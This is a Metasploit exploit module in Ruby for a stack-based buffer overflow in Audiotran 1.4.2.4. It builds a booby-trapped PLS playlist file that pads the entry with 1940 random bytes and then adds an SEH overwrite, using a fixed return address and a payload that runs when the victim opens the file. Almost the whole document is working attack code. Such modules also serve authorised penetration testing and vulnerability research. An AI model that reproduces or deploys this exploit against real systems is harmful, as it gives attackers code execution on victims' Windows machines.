##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Audiotran PLS File Stack Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack-based buffer overflow in Audiotran 1.4.2.4.
        An attacker must send the file to victim and the victim must open the file.
        Alternatively, it may be possible to execute code remotely via an embedded
        PLS file within a browser when the PLS extention is registered to Audiotran.
        This alternate vector has not been tested and cannot be exercised directly
        with this module.
      },
      'License'        => MSF_LICENSE,
      'Author'    =>
        [
          'Philip OKeefe',
        ],
      'References'     =>
        [
          [ 'EDB', '14961' ]
        ],
      'Payload'        =>
        {
          'Space'    => 5000,
          'BadChars' => "\x00\x0a\x0d\x3d",
          'StackAdjustment' => -3500,
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          [ 'Windows Universal', { 'Ret' => 0x1001cd67 } ], #p/p/r from amp3dj.ocx
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Sep 09 2010',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('FILENAME', [ true, 'The file name.',  'msf.pls']),
        ], self.class)
  end

  def exploit
    sploit = "[playlist]\r\nFile1="
    sploit << rand_text_alpha_upper(1940)
    sploit << generate_seh_payload(target.ret)
    print_status("Creating '#{datastore['FILENAME']}' file ...")
    file_create(sploit)
  end
end
